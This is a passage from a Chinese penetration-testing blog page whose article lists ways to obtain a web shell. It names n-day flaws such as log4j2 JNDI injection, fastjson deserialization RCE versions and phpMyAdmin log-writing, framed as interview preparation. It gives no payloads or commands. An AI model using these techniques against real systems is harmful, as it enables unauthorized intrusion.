+<li>解析漏洞</li>
+<li>….</li>
+</ul>
+</li>
+<li>nginx 漏洞 <ul>
+<li>解析漏洞</li>
+<li>….</li>
+</ul>
+</li>
+<li>IIS 漏洞 <ul>
+<li>解析漏洞</li>
+</ul>
+</li>
+</ol>
+<h3 id="5、组件的nday"><a href="#5、组件的nday" class="headerlink" title="5、组件的nday"></a>5、组件的nday</h3><ol>
+<li>log4j2 <ul>
+<li>rce , JNDI注入</li>
+</ul>
+</li>
+<li>fastjson <ul>
+<li>反序列话 rce</li>
+<li>1.2.24</li>
+<li>1.2.47</li>
+<li>….</li>
+</ul>
+</li>
+<li>phpmyadmin  ( 通过web页面操作数据库的组件 ) <ul>
+<li>通过写日志getshell</li>
+</ul>
+</li>
+<li>等等 …</li>
+</ol>
+<p>&#x3D;&#x3D;PS：一定要熟悉这些中间件，面试的时候会问。&#x3D;&#x3D;</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://threeshui.github.io">Maxenton</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://threeshui.github.io/2021/12/13/%E7%BD%91%E7%AB%99Getshell%E7%9A%84%E6%96%B9%E6%B3%95/">https://threeshui.github.io/2021/12/13/%E7%BD%91%E7%AB%99Getshell%E7%9A%84%E6%96%B9%E6%B3%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://threeshui.github.io" target="_blank">Maxenton</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">信息安全</a><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/">安全知识</a></div><div class="post_share"><div class="social-share" data-image="/img/getshell.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/12/13/%E5%85%8D%E6%9D%80/"><img class="prev-cover" src="/img/miansha.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">免杀</div></div></a></div><div class="next-post pull-right"><a href="/2021/11/10/%E5%88%9D%E8%AF%86pocsuite3%E6%A1%86%E6%9E%B6/"><img class="next-cover" src="/img/poc.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">初始PocSuite3框架</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/05/01/Linux%E6%8F%90%E6%9D%83/" title="Linux提权"><img class="cover" src="/img/getshell.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-05-01</div><div class="title">Linux提权</div></div></a></div><div><a href="/2021/12/13/%E5%85%8D%E6%9D%80/" title="免杀"><img class="cover" src="/img/miansha.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-13</div><div class="title">免杀</div></div></a></div><div><a href="/2021/11/10/%E5%88%9D%E8%AF%86pocsuite3%E6%A1%86%E6%9E%B6/" title="初始PocSuite3框架"><img class="cover" src="/img/poc.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-10</div><div class="title">初始PocSuite3框架</div></div></a></div><div><a href="/2021/09/19/%E6%A1%86%E6%9E%B6-%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/" title="框架-中间件多学习（一）"><img class="cover" src="/img/mid.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-09-19</div><div class="title">框架-中间件多学习（一）</div></div></a></div><div><a href="/2021/10/08/%E6%A1%86%E6%9E%B6-%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/" title="框架-中间件多学习（二）"><img class="cover" src="/img/mid.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-08</div><div class="title">框架-中间件多学习（二）</div></div></a></div><div><a href="/2021/10/20/BurpSuite%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E4%BD%BF%E7%94%A8/" title="BurpSuite工具的学习与使用"><img class="cover" src="/img/burp01.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-10-20</div><div class="title">BurpSuite工具的学习与使用</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Maxenton</div><div class="author-info__description">一个啥都只会一点的白帽子</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">51</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_15131581?spm=1030.2200.3001.5343"><i class="fab fa-cuttlefish"></i><span>CSDN欢迎关注</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/threeshui" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:peiyimiao@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_15131581?spm=1030.2200.3001.5343" target="_blank" title=""><i class="fab fa-cuttlefish"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到这里，愿君所遇即所爱！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%80%9A%E7%94%A8getshell%E6%96%B9%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">一、通用getshell方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.1.</span> <span class="toc-text">1、任意文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4-x2F-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8A%9F%E8%83%BD%E7%82%B9"><span class="toc-number">1.2.</span> <span class="toc-text">2、存在命令&#x2F;代码执行的功能点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%9B%BE%E7%89%87%E9%A9%AC-x2F-%E6%97%A5%E5%BF%97%E9%85%8D%E5%90%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell"><span class="toc-number">1.3.</span> <span class="toc-text">3、图片马&#x2F;日志配合文件包含getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9Egetshell"><span class="toc-number">1.4.</span> <span class="toc-text">4、解析漏洞getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91-x2F-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5getshell"><span class="toc-number">1.5.</span> <span class="toc-text">5、文件编辑&#x2F;文件写入getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81sql%E6%B3%A8%E5%85%A5getshell"><span class="toc-number">1.6.</span> <span class="toc-text">6、sql注入getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%8A%9F%E8%83%BD%E7%82%B9%E7%9A%84%E4%B8%80%E4%BA%9Bgetshell"><span class="toc-number">2.</span> <span class="toc-text">二、功能点的一些getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BDgetshell"><span class="toc-number">2.1.</span> <span class="toc-text">1、数据库备份getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%A8%A1%E6%9D%BF%E6%96%87%E4%BB%B6%E7%BC%96%E8%BE%91getshell"><span class="toc-number">2.2.</span> <span class="toc-text">3、模板文件编辑getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E4%BF%AE%E6%94%B9%E5%85%81%E8%AE%B8%E4%B8%8A%E4%BC%A0%E7%9A%84%E5%90%8E%E7%BC%80"><span class="toc-number">2.3.</span> <span class="toc-text">4、修改允许上传的后缀</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81nday"><span class="toc-number">3.</span> <span class="toc-text">三、nday</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81cms%E7%9A%84nday"><span class="toc-number">3.1.</span> <span class="toc-text">1、cms的nday</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%A1%86%E6%9E%B6%E7%9A%84nday"><span class="toc-number">3.2.</span> <span class="toc-text">2、框架的nday</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84nday"><span class="toc-number">3.3.</span> <span class="toc-text">3、中间件的nday</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81web%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84nday"><span class="toc-number">3.4.</span> <span class="toc-text">4、web服务器的nday</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E7%BB%84%E4%BB%B6%E7%9A%84nday"><span class="toc-number">3.5.</span> <span class="toc-text">5、组件的nday</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/10/13/git%E6%8E%A8%E9%80%81%E6%9C%AC%E5%9C%B0%E5%88%B0%E5%BA%93%E9%89%B4%E6%9D%83%E5%A4%B1%E8%B4%A5/" title="Git推送本地到库鉴权失败"><img src="/img/git_img.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Git推送本地到库鉴权失败"/></a><div class="content"><a class="title" href="/2022/10/13/git%E6%8E%A8%E9%80%81%E6%9C%AC%E5%9C%B0%E5%88%B0%E5%BA%93%E9%89%B4%E6%9D%83%E5%A4%B1%E8%B4%A5/" title="Git推送本地到库鉴权失败">Git推送本地到库鉴权失败</a><time datetime="2022-10-12T16:00:00.000Z" title="发表于 2022-10-13 00:00:00">2022-10-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/13/Yunzai-Bot%E6%8F%92%E4%BB%B6%E4%B8%ADpip%E5%91%BD%E4%BB%A4%E5%AE%89%E8%A3%85%E6%89%80%E9%9C%80%E5%BA%93%E6%8A%A5%E9%94%99/" title="Yunzai-Bot插件中pip命令安装报错"><img src="/img/yunzai_img.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Yunzai-Bot插件中pip命令安装报错"/></a><div class="content"><a class="title" href="/2022/09/13/Yunzai-Bot%E6%8F%92%E4%BB%B6%E4%B8%ADpip%E5%91%BD%E4%BB%A4%E5%AE%89%E8%A3%85%E6%89%80%E9%9C%80%E5%BA%93%E6%8A%A5%E9%94%99/" title="Yunzai-Bot插件中pip命令安装报错">Yunzai-Bot插件中pip命令安装报错</a><time datetime="2022-09-12T16:00:00.000Z" title="发表于 2022-09-13 00:00:00">2022-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/04/%E9%92%93%E9%B1%BC%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%BC%96%E5%86%99/" title="钓鱼软件的编写"><img src="/img/fishing.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="钓鱼软件的编写"/></a><div class="content"><a class="title" href="/2022/09/04/%E9%92%93%E9%B1%BC%E8%BD%AF%E4%BB%B6%E7%9A%84%E7%BC%96%E5%86%99/" title="钓鱼软件的编写">钓鱼软件的编写</a><time datetime="2022-09-03T16:00:00.000Z" title="发表于 2022-09-04 00:00:00">2022-09-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/08/14/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E7%A0%94%E7%A9%B6%E2%80%94%E2%80%94ensp%E9%85%8D%E7%BD%AE%E6%97%81%E6%8C%82%E4%B8%89%E5%B1%82%E7%BB%84%E7%BD%91%E7%A4%BA%E4%BE%8B%E3%80%90OSPF+%E4%B8%A4%E4%B8%AA%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9CWPAPSK%E8%AE%A4%E8%AF%81+DHCP%E3%80%91/" title="ensp配置旁挂三层组网示例"><img src="/img/ensp_img.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ensp配置旁挂三层组网示例"/></a><div class="content"><a class="title" href="/2022/08/14/%E7%94%9F%E5%91%BD%E5%9C%A8%E4%BA%8E%E7%A0%94%E7%A9%B6%E2%80%94%E2%80%94ensp%E9%85%8D%E7%BD%AE%E6%97%81%E6%8C%82%E4%B8%89%E5%B1%82%E7%BB%84%E7%BD%91%E7%A4%BA%E4%BE%8B%E3%80%90OSPF+%E4%B8%A4%E4%B8%AA%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9CWPAPSK%E8%AE%A4%E8%AF%81+DHCP%E3%80%91/" title="ensp配置旁挂三层组网示例">ensp配置旁挂三层组网示例</a><time datetime="2022-08-13T16:00:00.000Z" title="发表于 2022-08-14 00:00:00">2022-08-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/08/04/Python%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E7%BB%88%EF%BC%89/" title="Python学习日记（终）"><img src="/img/python_img.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Python学习日记（终）"/></a><div class="content"><a class="title" href="/2022/08/04/Python%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0%EF%BC%88%E7%BB%88%EF%BC%89/" title="Python学习日记（终）">Python学习日记（终）</a><time datetime="2022-08-03T16:00:00.000Z" title="发表于 2022-08-04 00:00:00">2022-08-04</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/getshell.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Maxenton</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="/js/custom/custom.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
